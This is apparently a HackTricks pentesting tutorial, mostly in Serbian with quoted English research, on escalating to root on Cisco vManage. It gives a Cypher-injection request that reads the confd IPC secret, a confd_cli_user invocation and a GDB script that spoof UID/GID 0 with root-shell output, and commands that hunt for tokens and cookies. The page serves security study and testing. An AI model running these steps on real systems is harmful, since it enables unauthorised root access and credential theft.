# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Kada imate code execution na Cisco vManage / *Catalyst SD-WAN Manager* kao `vmanage`, `netadmin` ili `vmanage-admin`, najzanimljivije lokalne privesc površine su obično `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs i root-owned import/upload handlers.

Ako vam još uvek treba **initial foothold** na controlleru, prvo pogledajte namensku control-plane stranicu:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Ako je `/etc/confd/confd_ipc_secret` čitljiv sa tvoje početne tačke, Path 1 i Path 2 odmah postaju praktični.

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Sećate se naše Neo4j instance? Ona radi pod privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo fajl koristeći prethodnu ranjivost:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` program ne podržava command line arguments, ali poziva `/usr/bin/confd_cli_user` sa argumentima. Dakle, mogli bismo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim setom arguments. Međutim, nije čitljiv sa našim trenutnim privilegijama, pa moramo da ga preuzmemo iz rootfs i kopiramo ga koristeći scp, pročitamo help, i iskoristimo ga da dobijemo shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.

When I disassembled `/usr/bin/confd_cli` binary, I observed the following:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Kada pokrenem “ps aux”, primetio sam sledeće (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Hipotetisao sam da program “confd_cli” prosleđuje user ID i group ID koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.

Moj prvi pokušaj bio je da pokrenem “cmdptywrapper” direktno i da mu prosledim `-g 0 -u 0`, ali je neuspeo. Izgleda da je neki file descriptor (-i 1015) kreiran negde usput i ne mogu da ga lažiram.

Kao što je pomenuto u synacktiv blogu(poslednji primer), program “confd_cli” ne podržava command line argument, ali mogu da utičem na njega pomoću debugger-a i srećom GDB je uključen na sistemu.

Napravio sam GDB skriptu u kojoj sam naterao API `getuid` i `getgid` da vraćaju 0. Pošto već imam “vmanage” privilege preko deserialization RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Izlaz konzole</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Putanja 3 (2025 CLI bug validacije ulaza - CVE-2025-20122)

Cisco je kasnije dokumentovao čistiju lokalnu root putanju u svom advisory-ju za [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **autentifikovani napadač sa samo read-only privilegijama** mogao je da pošalje crafted zahtev manager CLI-ju i dođe do root zbog nedovoljne validacije ulaza.

Iz ofanzivne perspektive, ovo je važna poenta:

1. Jednom kada imate *bilo kakvo* low-priv uporište na sistemu, trebalo bi da testirate lokalni CLI servis pre nego što krenete na teži Path 1 / Path 2 workflow.
2. Ponovo iskoristite artefakte iz Path 2 da pronađete trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Svako polje prosleđeno CLI backend-u tretirajte kao sumnjivo: UID/GID, username, terminal metadata, imported files, ili bilo koju vrednost koju kasnije koristi helper pod root privilegijama.
4. Ako low-priv korisnik može da dođe do lokalnog CLI socket-a i utiče na ta polja, root može biti udaljen samo jedan crafted zahtev.

Praktičan workflow nakon pristupa appliance-u je:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Ovo pretvara bug iz 2025. u dobar hunting obrazac za slične verzije: tražite **local CLI shims koji prikupljaju identitet u userland-u i prosleđuju ga privilegovanijem wrapper-u**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco-ovo februarsko 2026 advisory takođe je uvelo još jednu korisnu privesc klasu: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) je omogućio **authenticated, local attacker with low privileges** da dobije root zbog nedovoljnog user-authentication mehanizma u REST API-ju.

Ovo je važno zato što vManage privesc više nije ograničen samo na `confd`/TTY abuse. Nakon low-priv shell-a, takođe tražite:

- localhost-only API endpoints koji previše veruju caller-u
- tokens, cookies, ili service credentials čitljive iz trenutnog account-a
- root-only akcije izložene kroz `dataservice`/REST handlers koje se i dalje mogu lokalno okinuti

U praksi, kada jednom imate shell kao `vmanage` ili drugi service user, local API abuse je često tiši i lakši za automatizaciju nego interaktivni CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ako je lokalni session context dovoljan da pogodi privilegovanu REST funkcionalnost, preferiraj API path: lakše ga je replay, script, i chain sa stolen web sessions ili API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Još jedan nedavni pattern je [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalni attacker sa `netadmin` privilegijama mogao je da upload-uje **crafted file** koji je CLI kasnije nesigurno obradio, što je dovelo do command injection kao `root`.

Iz HackTricks ugla, vredna tehnika je šira od same konkretne CVE:

1. Enumeriši svaki CLI ili web workflow koji prihvata fajl: imports, diagnostic bundles, templates, validators, backups, tenant data, itd.
2. Prati gde uploadovani fajl završava i koji root-owned script ili binary ga koristi.
3. Testiraj da li se filename, sadržaj fajla ili parsed metadata ikada prosleđuju shell komandama, wrapper scripts, ili `system()`-style helperima.
4. Ako već možeš da dođeš do `netadmin` (valid creds, stolen session, ili auth-bypass chain), bugovi u obradi fajlova su često najbrži put do root.

Ova klasa buga posebno dobro chain-uje sa remote foothold-ovima koji daju `netadmin`, ali ne i `root`.

## Druge nedavne vManage/Catalyst SD-WAN Manager vulns za chain

- **Authenticated UI XSS (CVE-2024-20475)** – Ukradi admin session u web UI, zatim pivotuj u API/CLI actions koje na kraju dostižu `vshell` ili jedan od lokalnih privesc path-ova iznad.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Veoma jak precursor za Path 5 jer je `netadmin` upravo nivo potreban za 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Korisno za ubacivanje fajlova koji će kasnije biti parsirani od strane privileged components ili za prepisivanje operational artifacts koje koriste root-owned helperi.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Bolje dokumentovan na posebnoj SD-WAN control-plane stranici; može da doda SSH key za `vmanage-admin`, dajući ti lokalni foothold potreban da se vratiš na ovu stranicu.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
